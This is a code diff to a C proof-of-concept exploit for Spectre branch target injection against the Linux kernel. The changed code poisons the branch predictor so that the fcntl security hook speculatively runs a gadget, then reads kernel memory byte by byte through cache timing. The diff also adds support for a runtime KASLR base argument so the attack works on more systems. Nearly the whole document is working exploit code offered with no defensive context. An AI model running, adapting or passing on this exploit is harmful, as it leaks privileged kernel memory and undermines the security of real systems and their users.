@@ -12,6 +12,27 @@
 #include <sys/mman.h>
 
 
+// Addr of next inst after the target callq in security_file_fcntl
+#define CALL_ADDR_NEXT_INST (0xffffffff8138fcf3)
+// Proximal mov (%rdx) gadget
+#define GADGET_ADDR (0xffffffff81392126)
+#define GADGET_RDX_OFFSET (0)
+
+#define KERNEL_STEXT_NO_ASLR (0xffffffff81000000)
+#define CALLQ_SIZE (2)
+
+#define L3_CACHE_SIZE (4 * 1024 * 1024)
+
+#define CACHE_ELEMS (256)
+#define CACHE_ELEM_SIZE (4096)
+
+#define MIN_VARIANCE_MULT (3)
+#define BYTE_READ_ATTEMPTS (10000)
+#define BYTE_CONFIDENCE_THRESH (3)
+#define ZERO_CONFIDENCE_THRESH (50)
+
+#define SPACED_OUT __attribute__ ((aligned (0x100000))) 
+
 extern void clflush(const void *ptr);
 extern void mfence(void);
 extern uint64_t measure_access_time(void *ptr);
@@ -19,28 +40,6 @@ extern void do_access(uint8_t *our_buffer, uint8_t *ptr);
 extern void *after_exception;
 extern uint8_t btb_call;
 extern uint8_t btb_gadget;
-
-
-#define SPACED_OUT __attribute__ ((aligned (0x100000))) 
-
-#define L3_CACHE_SIZE (4 * 1024 * 1024)
-
-#define CACHE_ELEMS (256)
-#define CACHE_ELEM_SIZE (4096)
-
-// Addr of next inst after the target callq in security_file_fcntl
-#define CALL_ADDR_NEXT_INST ((0x11a00000ULL + 0xffffffff8138fcf3ULL) & 0x000000ffffffffff)
-// Proximal mov (%rdx) gadget
-#define GADGET_ADDR ((0x11a00000ULL + 0xffffffff81392126ULL) & 0x000000ffffffffff)
-#define GADGET_RDX_OFFSET (0)
-
-#define MIN_VARIANCE_MULT (3)
-#define BYTE_READ_ATTEMPTS (10000)
-#define BYTE_CONFIDENCE_THRESH (3)
-#define ZERO_CONFIDENCE_THRESH (100)
-
-#define CALLQ_SIZE (2)
-#define CALL_ADDR (CALL_ADDR_NEXT_INST - CALLQ_SIZE)
 
 
 typedef void (call_addr_func_t)(void *ptr);
@@ -62,6 +61,9 @@ SPACED_OUT protected_buffer_t our_buffer = {0};
 int fcntl_fd = -1;
 // This buffer is used simply to evict the L3/L2 cache
 SPACED_OUT uint8_t l3_cache_sized_buffer[L3_CACHE_SIZE] = {0};
+
+uint64_t call_addr = 0;
+uint64_t gadget_addr = 0;
 
 
 void sighandler(int sig, siginfo_t *info, void *_context)
@@ -107,7 +109,7 @@ bool measure_memory_byte_once(uint8_t *ptr, uint8_t *out_byte)
     evict_our_buffer();
 
     // Perform Spectre branch target injection once 
-    ((call_addr_func_t *)(CALL_ADDR))((void *)(GADGET_ADDR));
+    ((call_addr_func_t *)(call_addr))((void *)(gadget_addr));
     // Trigger the indirect jmp security_ops->file_fcntl(file, cmd, arg), hoping that security_ops is uncached
     syscall(__NR_fcntl, fcntl_fd, 0, ((uint64_t)ptr) - GADGET_RDX_OFFSET);
 
@@ -189,17 +191,24 @@ int main(int argc, const char *argv[])
     struct sigaction sa;
     sa.sa_sigaction = sighandler;
     sa.sa_flags = SA_SIGINFO;
+    int64_t aslr_delta = 0;
     uint64_t addr = 0;
     uint32_t len = 0;
     uint8_t *btb_page = NULL;
 
-    if (argc < 3) {
-        printf("usage: <addr> <len>");
+    if (argc < 4) {
+        printf("usage: <aslr_base> <addr> <len>");
         return 0;
     }
 
-    addr = strtoull(argv[1], NULL, 0);
-    len = strtoul(argv[2], NULL, 0);
+    aslr_delta = strtoull(argv[1], NULL, 0) - KERNEL_STEXT_NO_ASLR;
+    addr = strtoull(argv[2], NULL, 0);
+    len = strtoul(argv[3], NULL, 0);
+
+    // The addresses for BTI here have the lower 40 bits identical with the
+    // targeted kernel addresses.
+    call_addr = (aslr_delta + CALL_ADDR_NEXT_INST - CALLQ_SIZE) & 0xffffffffff;
+    gadget_addr = (aslr_delta + GADGET_ADDR) & 0xffffffffff;
 
     sigaction(SIGSEGV, &sa, NULL);
 
@@ -207,15 +216,15 @@ int main(int argc, const char *argv[])
     fcntl_fd = open("/etc/passwd", O_RDONLY);
     assert(fcntl_fd > -1);
 
-    btb_page = mmap((void*)(CALL_ADDR & 0xfffffff000),
+    btb_page = mmap((void*)(call_addr & 0xfffffff000),
                     0x100000,
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-    assert((uint64_t)btb_page == (CALL_ADDR & 0xfffffff000));
+    assert((uint64_t)btb_page == (call_addr & 0xfffffff000));
 
     /* copy btb_call and btb_gadget */
-    memcpy((void *)(CALL_ADDR), &btb_call, 0x100);
-    memcpy((void *)(GADGET_ADDR), &btb_gadget, 0x100);
+    memcpy((void *)(call_addr), &btb_call, 0x100);
+    memcpy((void *)(gadget_addr), &btb_gadget, 0x100);
 
     dump_memory((uint8_t *)(addr), len);
 
